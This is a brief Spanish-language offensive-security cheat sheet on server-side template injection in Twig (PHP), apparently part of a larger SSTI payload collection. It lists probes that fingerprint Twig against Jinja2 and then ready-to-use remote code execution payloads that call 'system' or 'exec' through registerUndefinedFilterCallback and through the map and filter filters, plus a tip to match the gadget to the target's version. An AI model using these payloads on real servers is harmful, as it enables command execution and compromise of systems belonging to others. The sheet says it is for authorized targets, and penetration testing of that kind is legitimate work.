# SSTI — Twig (PHP)

Ver índice: [ssti.md](ssti.md). **Solo sobre objetivos autorizados.**

## Confirmar

```
{{7*7}}      -> 49
{{7*'7'}}    -> 49        (a diferencia de Jinja2, que da 7777777)
{{_self}}    -> referencia al entorno Twig
```

## Camino a RCE

```
# versiones con registerUndefinedFilterCallback
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
# filtro map/filter en versiones modernas
{{['id']|map('system')|join}}
{{['id']|filter('system')}}
```

## Notas

- El `7*'7' = 49` ayuda a distinguir Twig de Jinja2.
- Ajusta el gadget a la versión de Twig del target.
